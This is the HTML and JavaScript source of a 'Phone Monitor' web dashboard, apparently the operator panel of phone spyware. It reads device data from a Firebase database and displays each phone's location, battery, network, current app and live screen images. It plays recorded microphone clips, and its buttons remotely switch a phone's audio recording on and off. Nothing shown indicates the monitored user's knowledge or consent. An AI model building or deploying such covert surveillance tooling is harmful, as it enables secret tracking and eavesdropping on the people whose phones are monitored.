<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Phone Monitor</title>
  <style>
    body { font-family: system-ui, sans-serif; background:#0d1117; color:#e6edf3; margin:0; padding:16px; }
    h1 { font-size:20px; }
    .card { background:#161b22; border:1px solid #30363d; border-radius:12px; padding:16px; margin:12px 0; }
    .online { color:#3fb950; font-weight:700; }
    .offline { color:#f85149; font-weight:700; }
    .id { font-size:11px; color:#8b949e; word-break:break-all; margin:4px 0 12px; }
    .dot { height:10px; width:10px; border-radius:50%; display:inline-block; margin-right:6px; }
    .row { display:flex; justify-content:space-between; padding:6px 0; border-top:1px solid #21262d; }
    .row span:first-child { color:#8b949e; }
    a { color:#58a6ff; }
    input { width:100%; padding:12px; margin:8px 0; border-radius:8px; border:1px solid #30363d; background:#0d1117; color:#e6edf3; box-sizing:border-box; }
    button { width:100%; padding:12px; border:none; border-radius:8px; background:#238636; color:#fff; font-weight:600; cursor:pointer; }
    #login { max-width:340px; margin:60px auto; }
    #err { color:#f85149; font-size:14px; }
    #logout { width:auto; padding:6px 12px; background:#30363d; font-size:12px; float:right; }
  </style>
</head>
<body>
  <!-- Login screen -->
  <div id="login" class="card">
    <h1>🔒 Phone Monitor Login</h1>
    <input id="user" placeholder="Email" autocomplete="username" />
    <input id="pass" type="password" placeholder="Password" autocomplete="current-password" />
    <button id="loginBtn">Login</button>
    <p id="err"></p>
  </div>

  <!-- Dashboard (hidden until login) -->
  <div id="app" style="display:none">
    <button id="logout">Logout</button>
    <h1>📱 Phone Monitor — Devices</h1>
    <button id="listen" style="width:auto;padding:8px 14px;background:#1f6feb;font-size:13px;margin-bottom:8px;">🔊 Enable audio</button>
    <div id="list">Loading...</div>
  </div>

  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
    import { getDatabase, ref, onValue, set } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";
    import { getAuth, signInWithEmailAndPassword, signOut, onAuthStateChanged }
      from "https://www.gstatic.com/firebasejs/10.12.2/firebase-auth.js";

    const firebaseConfig = {
      apiKey: "AIzaSyD-AVieCO3svf-FJVYF7jM-vB7LoAhA96Y",
      authDomain: "phonemonitor-d5cd2.firebaseapp.com",
      databaseURL: "https://phonemonitor-d5cd2-default-rtdb.firebaseio.com",
      projectId: "phonemonitor-d5cd2",
      storageBucket: "phonemonitor-d5cd2.firebasestorage.app",
      messagingSenderId: "182639081088",
      appId: "1:182639081088:android:90ec33a07bed0c22e79865"
    };

    const app = initializeApp(firebaseConfig);
    const db = getDatabase(app);
    const auth = getAuth(app);

    // full email as-is
    const toEmail = (u) => u.trim();

    document.getElementById("loginBtn").onclick = () => {
      const u = document.getElementById("user").value;
      const p = document.getElementById("pass").value;
      document.getElementById("err").textContent = "";
      signInWithEmailAndPassword(auth, toEmail(u), p)
        .catch(() => document.getElementById("err").textContent = "Wrong username or password.");
    };
    document.getElementById("logout").onclick = () => signOut(auth);

    // Audio: browsers block autoplay until a click, so use a button to enable
    let audioOn = false;
    const lastAudio = {};
    document.getElementById("listen").onclick = () => {
      audioOn = true;
      document.getElementById("listen").textContent = "🔊 Audio ON";
    };

    const timeAgo = (t) => {
      if (!t) return "-";
      const s = Math.floor((Date.now() - t) / 1000);
      if (s < 60) return s + "s ago";
      if (s < 3600) return Math.floor(s/60) + "m ago";
      return new Date(t).toLocaleString();
    };

    // Show dashboard only when logged in
    onAuthStateChanged(auth, (loggedUser) => {
      const loginBox = document.getElementById("login");
      const appBox = document.getElementById("app");
      if (!loggedUser) { loginBox.style.display = "block"; appBox.style.display = "none"; return; }
      loginBox.style.display = "none";
      appBox.style.display = "block";

      onValue(ref(db, "devices"), (snap) => {
        const data = snap.val() || {};
        const list = document.getElementById("list");
        const ids = Object.keys(data);
        if (ids.length === 0) { list.textContent = "No devices found."; return; }

        list.innerHTML = ids.map(id => {
          const d = data[id];
          const live = d.live || {};
          const screen = d.screen || {};
          const img = screen.frame
            ? `<img src="data:image/jpeg;base64,${screen.frame}" style="width:100%;border-radius:8px;margin-top:12px;border:1px solid #30363d" />`
            : "";
          const online = d.status === "online";
          const map = (live.lat && live.lng)
            ? `<a href="https://www.google.com/maps?q=${live.lat},${live.lng}" target="_blank">View on map</a>`
            : "-";
          return `<div class="card">
            <div><span class="dot ${online?'online':'offline'}" style="background:${online?'#3fb950':'#f85149'}"></span>
            <span class="${online?'online':'offline'}">${online?'ONLINE':'OFFLINE'}</span></div>
            <div class="id">${id}</div>
            <div class="row"><span>🔋 Battery</span><span>${live.battery ?? '-'}%</span></div>
            <div class="row"><span>📶 Network</span><span>${live.network ?? '-'}</span></div>
            <div class="row"><span>📱 Current app</span><span>${live.currentApp ?? '-'}</span></div>
            <div class="row"><span>📍 Location</span><span>${map}</span></div>
            <div class="row"><span>🕒 Last seen</span><span>${timeAgo(d.lastSeen)}</span></div>
            <div style="margin-top:10px;display:flex;gap:8px;flex-wrap:wrap">
              <button class="ctl" data-id="${id}" data-act="audio-on" style="width:auto;padding:6px 10px;background:#238636;font-size:12px">🎤 Start audio</button>
              <button class="ctl" data-id="${id}" data-act="audio-off" style="width:auto;padding:6px 10px;background:#8957e5;font-size:12px">🔇 Stop audio</button>
              <button class="ctl" data-id="${id}" data-act="screen-off" style="width:auto;padding:6px 10px;background:#da3633;font-size:12px">🛑 Stop screen</button>
            </div>
            ${img}
          </div>`;
        }).join("");

        // Control buttons -> write to Firebase, phone reacts
        document.querySelectorAll(".ctl").forEach(b => b.onclick = () => {
          const id = b.dataset.id, act = b.dataset.act;
          if (act === "audio-on")  set(ref(db, `devices/${id}/control/audio`), true);
          if (act === "audio-off") set(ref(db, `devices/${id}/control/audio`), false);
          if (act === "screen-off") set(ref(db, `devices/${id}/control/screen`), false);
        });

        // Play new audio clips (~4s each)
        if (audioOn) {
          ids.forEach(id => {
            const a = data[id].audio || {};
            if (a.clip && a.at && a.at > (lastAudio[id] || 0)) {
              lastAudio[id] = a.at;
              new Audio("data:audio/mp4;base64," + a.clip).play().catch(() => {});
            }
          });
        }
      }, (error) => {
        document.getElementById("list").textContent = "Access denied. " + error.message;
      });
    });
  </script>
</body>
</html>
